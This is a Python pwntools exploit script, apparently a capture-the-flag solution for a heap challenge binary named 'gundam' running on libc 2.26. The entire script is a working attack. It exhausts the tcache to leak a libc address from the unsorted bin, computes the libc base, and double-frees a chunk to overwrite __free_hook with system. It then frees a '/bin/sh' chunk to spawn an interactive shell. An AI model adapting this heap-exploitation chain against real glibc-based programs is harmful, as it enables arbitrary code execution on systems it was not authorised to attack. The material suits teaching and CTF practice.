#!/usr/bin/env python

from pwn import *
# fastbin_dup_consolidate
# context.log_level = 'debug'


def build(name, type):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('The name of gundam :')
    io.send(name)
    io.recvuntil('The type of the gundam :')
    io.sendline(str(type))


def visit(until=False):
    io.recvuntil('Your choice :')
    io.sendline('2')

    if until is not False:
        io.recvuntil(until)


def destroy(index):
    io.recvuntil('Your choice :')
    io.sendline('3')
    io.recvuntil('Which gundam do you want to Destory:')
    io.sendline(str(index))


def blow_up_factory():
    io.recvuntil('Your choice :')
    io.sendline('4')


if __name__ == "__main__":

    binary = './gundam'

    io = process(binary)

    e = ELF(binary)
    libc = ELF('./libc.so.6')

    # Chunk 9.
    build('A', 0)
    build('B', 0)
    build('C', 0)
    build('D', 0)
    build('F', 0)
    build('G', 0)
    build('H', 0)
    build('I', 0)
    build('J', 0)

    for i in range(0, 7):
        # libc-2.26 has 7 tcache,  tcache 7 all freed -> The rest are handled as heaps normally
        destroy(i)

    destroy(7)				# unsorted bins create!!

    blow_up_factory()

    for i in range(0, 8):
        build(chr(0x41+i)*8, 0)

    visit(until='H'*8)
    libc_leak = u64(io.recv(6).ljust(8, '\x00'))
    libc_base = libc_leak-0x3dac78

    __free_hook = libc_base+libc.symbols['__free_hook']
    system = libc_base+libc.symbols['system']

    destroy(3)
    destroy(2)
    destroy(1)
    destroy(1)				# regardless of size double free

    blow_up_factory()

    build(p64(__free_hook), 0)
    build('/bin/sh\00', 0)
    build(p64(system), 0)

    destroy(2)
    io.interactive()
